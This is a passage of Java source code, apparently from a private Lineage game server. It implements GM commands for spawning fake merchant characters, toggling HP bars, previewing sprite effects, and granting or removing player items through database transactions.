	private static Random BUILDER_AD_SHOP_RANDOM =  new Random(System.nanoTime());


	private static final int[] BUILDER_AD_SHOP_MALE = new int[] { 0, 61, 138, 734, 2786, 6658, 6671 };
	private static final int[] BUILDER_AD_SHOP_FEMALE = new int[] { 1, 48, 37, 1186, 2796, 6661, 6650 };


	private static void BuilderCmd_ad_shop(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer stringtokenizer = new StringTokenizer(arg);
			String name = stringtokenizer.nextToken();

			if (CharacterTable.getInstance().isContainNameList(name) || CWorld.getInstance().getPlayer(name) != null) {
				SC_SystemMessage.send(pc, "이미 존재하는 캐릭터 이름입니다");
				return;
			}
			
			int sex = BUILDER_AD_SHOP_RANDOM.nextInt(1);
			int type = BUILDER_AD_SHOP_RANDOM.nextInt(BUILDER_AD_SHOP_MALE.length);
			int AccountName = 1;

			BuilderCreateAdShop(pc.getAccountName(), name, sex, type, pc.getX(), pc.getY(), pc.getHeading(), pc.getMapId());

			Connection con = null;
			PreparedStatement pstm = null;

			try {
				con = DatabaseFactory.getInstance().getConnection();
				pstm = con.prepareStatement("INSERT INTO adshop SET account = ?, name = ?, sex = ?, type = ?, x = ?, y = ?, heading = ?, map_id = ?");
				pstm.setInt(1, AccountName);
				pstm.setString(2, name);
				pstm.setInt(3, sex);
				pstm.setInt(4, type);
				pstm.setInt(5, pc.getX());
				pstm.setInt(6, pc.getY());
				pstm.setInt(7, pc.getHeading());
				pstm.setInt(8, pc.getMapId());
				pstm.execute();				

			} catch(Exception e) {  
				
			} finally {
				SQLUtil.close(pstm);
				SQLUtil.close(con);
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, (new StringBuilder()).append(".장사시작 [캐릭이름]로 입력해 주세요. "). toString());
		}
	}
	
	public static void BuilderCreateAdShop(String account, String name, int sex, int type, int x, int y, int heading, int mapId) {
		if (CharacterTable.getInstance().isContainNameList(name) || CWorld.getInstance().getPlayer(name) != null) {
			return;
		}

		L1PcInstance newPc = new L1PcInstance();
		newPc.setAccountName(account);
		newPc.setId(IdFactory.getInstance().nextId());
		newPc.setName(name);
		newPc.setHighLevel(1);
		newPc.setExp(0);
		newPc.addBaseMaxHp((short)2000);//14
		newPc.setCurrentHp(2000);//14
		newPc.setDead(false);
		newPc.setStatus(0);
		newPc.addBaseMaxMp((short)2);
		newPc.setCurrentMp(2);		
		newPc.SetOriginalStatStr(16);
		newPc.SetStatStr(16);
		newPc.SetOriginalStatCon(16);
		newPc.SetStatCon(16);
		newPc.SetOriginalStatDex(11);
		newPc.SetStatDex(11);
		newPc.SetOriginalStatCha(13);
		newPc.SetStatCha(13);
		newPc.SetOriginalStatInt(12);
		newPc.SetStatInt(12);
		newPc.SetOriginalStatWis(11);
		newPc.SetStatWis(11);
		
		int klass = 0;		
		if (sex == 0) {
			klass = BUILDER_AD_SHOP_MALE[type];
		} else {
			klass = BUILDER_AD_SHOP_FEMALE[type];			
		}
		//newPc.setCurrentWeapon(46);//단검
		//newPc.setCurrentWeapon(50);}//양검
			//newPc.setCurrentWeapon(20);//활
			//newPc.setCurrentWeapon(58);//이도
			//newPc.setCurrentWeapon(54);//크로우
			//newPc.setCurrentWeapon(50);//체인소드
			//newPc.setCurrentWeapon(24);//창
		newPc.setCurrentWeapon(0);
		newPc.setClassId(klass);
		newPc.setCurrentSprite(klass);
		newPc.set_sex(sex);
		newPc.setType(type);
		newPc.setHeading(heading);
		newPc.setX(x);
		newPc.setY(y);
		newPc.setMap((short)mapId);
		newPc.set_food(39);
		newPc.setLawful(0);
		newPc.setTitle("");
		newPc.setClanid(0);
		newPc.setClanname("");
		newPc.setClanRank(0);
		newPc.setBonusStats(0);
		newPc.setElixirStats(0);
		newPc.setElfAttr(0);
		newPc.set_PKcount(0);
		newPc.setExpRes(0);
		newPc.setPartnerId(0);
		newPc.setAccessLevel((short)0);
		newPc.setGm(false);
		newPc.setMonitor(false);
		newPc.setOnlineStatus(1);
		newPc.setHomeTownId(0);
		newPc.setContribution(0);

		newPc.setBanned(false);
		newPc.setKarma(0);
		newPc.setReturnStat(0);
		newPc.refresh();
		newPc.setMoveSpeed(0);
		newPc.setBraveSpeed(0);
		newPc.setGmInvis(false);		
		CWorld.getInstance().storeAndEnterWorld(newPc);
		newPc.setNetConnection(null);
		newPc.startObjectAutoUpdate();
		
		byte[] chat = Config.PRIVATE_SHOP_CHAT.getBytes();
		
		newPc.openDisplayPrivateStore(chat);
		SC_DoActionShop.send(newPc, newPc.getId(), ActionCodes.ACTION_Shop, chat);
		SC_DoActionShop.broadcast(newPc, newPc.getId(), ActionCodes.ACTION_Shop, chat);		
	}



	private static void BuilderCmd_hp_bar(
			L1PcInstance pc,
			String cmdName,
			String arg) {

		if (arg.equalsIgnoreCase("켬")) {

			pc.setSkillEffect(
					L1SkillId.GMSTATUS_HPBAR,
					0);

			/*
			 * HP BAR 전용 300ms wheel task 시작.
			 * 일반 PC에는 task 자체가 존재하지 않는다.
			 */
			CIOThreadCallback.getInstance().startHpBar(pc);

			/*
			 * 켜는 순간에는 다음 300ms를 기다리지 않고
			 * 현재 화면의 HP BAR를 즉시 한 번 보낸다.
			 */
			for (L1Object obj : pc.getKnownObjects()) {
				if (L1PcInstance.isHpBarTarget(obj)) {
					SC_HPMeter.send(pc, (L1Character) obj);
				}
			}

		} else if (arg.equalsIgnoreCase("끔")) {

			/*
			 * 먼저 recurring task를 끊는다.
			 * 이후 HP BAR 제거 패킷을 보낸 뒤
			 * 다음 tick에서 다시 살아나는 것을 막는다.
			 */
			CIOThreadCallback.getInstance().stopHpBar(pc);

			pc.removeSkillEffect(
					L1SkillId.GMSTATUS_HPBAR);

			/*
			 * 현재 클라이언트에 남아 있는 HP BAR 즉시 삭제.
			 */
			for (L1Object obj : pc.getKnownObjects()) {
				if (L1PcInstance.isHpBarTarget(obj)) {
					SC_HPMeter.send(pc, obj.getId(), 0xFF, 0xFF);
				}
			}

		} else {
			SC_SystemMessage.send(pc, cmdName
							+ " [켬,끔] 라고 입력해 주세요. ");
		}
	}



	// Both display commands use the same action lookup and timer callback.
	private static void BuilderSpawnImpact(L1PcInstance pc, boolean attack, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			int first = Integer.parseInt(st.nextToken());
			int last = Integer.parseInt(st.nextToken());
			int homeX = pc.getX(), homeY = pc.getY(), x = homeX, y = homeY;
			int row = 10;
			L1Npc template = CObjectDB.GetNPC(45001);
			Constructor<?> constructor = Class.forName("l1j.server.server.model.Instance." + template.getImpl() + "Instance").getConstructors()[0];
			Object[] arguments = {template};
			TLongArrayList entries = BuilderLoadImpact(first, last, attack);
			for (int i = 0, count = entries.size(); i < count; i++) {
				long entry = entries.get(i);
				int sprite = (int) (entry >>> 32);
				int action = (int) entry;
				L1NpcInstance npc = (L1NpcInstance) constructor.newInstance(arguments);
				npc.setId(IdFactory.getInstance().nextId());
				npc.setCurrentSprite(sprite);
				npc.setNameId(Integer.toString(sprite));
				npc.setMap(pc.getMapId());
				if (attack) {
					int column = i % 5;
					if (column == 0 && i > 0) { x -= 2; y += 2; }
					npc.setX(x + column * 2);
					npc.setY(y + column * 2);
				} else {
					npc.setX(x);
					npc.setY(y);
				}
				npc.setHomeX(npc.getX());
				npc.setHomeY(npc.getY());
				npc.setHeading(4);
				CWorld.getInstance().storeAndEnterWorld(npc);
				CWorldWork.scheduleRequired(new BuilderImpactTask(npc, action), 1000);
				npc.startTimedDelete(60 * 60 * 1000);
				if (!attack) {
					if (i == row) {
						x = homeX - 4 * (row / 10);
						y = homeY + 4 * (row / 10);
						row += 10;
					} else { x += 4; y += 4; }
				}
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, attack ? ".셀엔피씨 (시작번호) (나올갯수)" : ".셀이펙트 (시작번호) (나올갯수)");
			SC_SystemMessage.send(pc, "번호끝 : 18367");
		}
	}

	private static TLongArrayList BuilderLoadImpact(int first, int last, boolean attack) {
		TLongArrayList result = new TLongArrayList();
		try (Connection con = DatabaseFactory.getInstance().getConnection();
			 PreparedStatement ps = con.prepareStatement("SELECT * FROM spr_action WHERE act_name = ?")) {
			ps.setString(1, attack ? "attack" : "effect");
			try (ResultSet rs = ps.executeQuery()) {
				while (rs.next()) {
					int sprite = rs.getInt("spr_id");
					if (sprite >= first && sprite <= last) {
						result.add(((long) sprite << 32) | (rs.getInt("act_id") & 0xffffffffL));
					}
				}
			}
		} catch (SQLException e) {
			_log.log(Level.SEVERE, e.getLocalizedMessage(), e);
		}
		return result;
	}

	private static final class BuilderImpactTask implements Runnable {
		private final L1NpcInstance npc;
		private final int action;

		private BuilderImpactTask(L1NpcInstance npc, int action) {
			this.npc = npc;
			this.action = action;
		}

		@Override
		public void run() {
			try {
				if (npc == null || npc._destroyed) return;
				SC_DoActionGFX.broadcast(npc, action);
				CWorldWork.scheduleRequired(this, 3000);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	private static boolean builderFullAccess(L1PcInstance gm) {
		return gm != null && gm.getAccessLevel() > 0 && gm.getAccessLevel() == Config.GMCODE && gm.getAccessLevel() != Config.SUB_GMCODE;
	}
	private static boolean builderLive(L1PcInstance pc, CUserSocket socket, int stamp) {
		return pc != null && socket != null && pc.getSessionStamp() == stamp && pc.getNetConnection() == socket
				&& socket.isConnected() && socket.getActiveChar() == pc && !pc.isLogoutStarted();
	}
	private static void builderReply(L1PcInstance gm, CUserSocket socket, int stamp, String message) {
		if (builderFullAccess(gm) && (socket == null || builderLive(gm, socket, stamp)))
			SC_SystemMessage.send(gm, message);
	}
	private static void builderOnItemOwner(L1PcInstance gm, L1PcInstance target, Runnable action) {
		if (!builderFullAccess(gm)) return;
		final CUserSocket gmSocket = gm.getNetConnection();
		final int gmStamp = gm.getSessionStamp();
		final CUserSocket socket = target == null ? null : target.getNetConnection();
		final int stamp = target == null ? 0 : target.getSessionStamp();
		if (!builderLive(target, socket, stamp)) {
			builderReply(gm, gmSocket, gmStamp, "접속 중인 캐릭터만 처리할 수 있습니다.");
			return;
		}
		CIOThreadCallback.getInstance().completeSession(socket, () -> {
			if (!builderFullAccess(gm) || (gmSocket != null && !builderLive(gm, gmSocket, gmStamp))
					|| !builderLive(target, socket, stamp)) throw new IllegalStateException("Stale GM item request");
			action.run();
		}, failure -> {
			if (failure != null) builderReply(gm, gmSocket, gmStamp,
					target.getName() + ": 요청 실패 또는 인벤토리 처리 중입니다.");
		});
	}
	private static l1j.server.server.model.inventory.L1InventoryTransaction builderItemTransaction(L1PcInstance target) {
		return l1j.server.server.model.inventory.L1InventoryTransaction.begin(target,
				CacheD.accountOrderKey("$builder-item", target.getId()));
	}
	private static void builderValidateGrant(L1Item template, int count, int enchant, int attribute, int bless) {
		if (template == null || count <= 0 || count > CInventory.MAX_AMOUNT
				|| (!template.isStackable() && count > CUserInventory.MAX_SIZE)
				|| enchant < -128 || enchant > 127 || attribute < 0 || attribute > 20
				|| (bless != 0 && bless != 129)) throw new IllegalArgumentException("Invalid GM item grant");
	}
	private static void builderStageGrant(l1j.server.server.model.inventory.L1InventoryTransaction tx,
			L1Item template, int count, int enchant, int attribute, int bless) {
		builderValidateGrant(template, count, enchant, attribute, bless);
		final L1ItemInstance image = new L1ItemInstance(template, count);
		image.setIdentified(true);
		image.setBless(bless == 129 ? 129 : template.getBless());
		image.setEnchantLevel(template.isStackable() ? 0 : enchant);
		image.setAttrEnchantLevel(template.isStackable() ? 0 : attribute);
		if (tx.grant(image) == null) throw new IllegalStateException("Grant capacity exceeded");
	}
	private static L1Item builderFindItem(String value) {
		int id;
		try { id = Integer.parseInt(value); }
		catch (NumberFormatException e) { id = CObjectDB.LoadItem().findItemIdByNameWithoutSpace(value); }
		return CObjectDB.GetItem(id);
	}
	private static void builderGrant(L1PcInstance gm, L1PcInstance target, L1Item template,
			int count, int enchant, int attribute, int bless) {
		builderValidateGrant(template, count, enchant, attribute, bless);
		final CUserSocket gmSocket = gm.getNetConnection();
		final int gmStamp = gm.getSessionStamp();
		builderOnItemOwner(gm, target, () -> {
			try (var tx = builderItemTransaction(target)) {
				builderStageGrant(tx, template, count, enchant, attribute, bless);
				tx.onTerminalFailure(() -> builderReply(gm, gmSocket, gmStamp,
						target.getName() + ": DB 결과 확인 필요. 재지급하지 마십시오."));
				tx.commit(() -> {
					builderReply(gm, gmSocket, gmStamp, target.getName() + ": " + template.getName() + " " + count + "개 지급 완료");
					if (target != gm) {
						SC_SystemMessage.send(target, "운영자 선물: " + template.getName() + " " + count + "개");
						SC_SkillSound.send(target, target.getId(), 4856);
					}
				});
			}
		});
	}
	private static void builderDelete(L1PcInstance gm, L1PcInstance target, int objectId, int count, boolean all) {
		final CUserSocket gmSocket = gm.getNetConnection();
		final int gmStamp = gm.getSessionStamp();
		builderOnItemOwner(gm, target, () -> {
			try (var tx = builderItemTransaction(target)) {
				int rows = 0;
				if (all) {
					for (L1ItemInstance item : target.getInventory().getItems()) {
						if (item.isEquipped()) continue;
						if (!tx.debit(item, item.getCount())) throw new IllegalStateException("Protected inventory row");
						rows++;
					}
				} else {
					final L1ItemInstance item = target.getInventory().GetByServerID(objectId);
					if (item == null || item.isEquipped()) {
						builderReply(gm, gmSocket, gmStamp, "고유번호를 확인하고 착용을 먼저 해제하십시오.");
						return;
					}
					if (!tx.debit(item, count == 0 ? item.getCount() : count)) {
						builderReply(gm, gmSocket, gmStamp, "수량 부족 또는 보호된 아이템입니다.");
						return;
					}
					rows = 1;
				}
				if (rows == 0) { builderReply(gm, gmSocket, gmStamp, "회수할 아이템이 없습니다."); return; }
				final int committedRows = rows;
				tx.onTerminalFailure(() -> builderReply(gm, gmSocket, gmStamp,
						target.getName() + ": 회수 DB 결과 확인 필요. 재시도하지 마십시오."));
				tx.commit(() -> builderReply(gm, gmSocket, gmStamp,
						target.getName() + ": 아이템 " + committedRows + "개 항목 회수 완료"));
			}
		});
	}
	private static void builderGiftOnline(L1PcInstance gm, L1Item template, int count, int enchant) {
		builderValidateGrant(template, count, enchant, 0, 0);
		for (L1PcInstance target : CWorld.getInstance().getAllPlayers()) {
			if (target == null || target.isGhost() || target.isPrivateShop() || target.getNetConnection() == null) continue;
			builderGrant(gm, target, template, count, enchant, 0, 0);
		}
	}

}
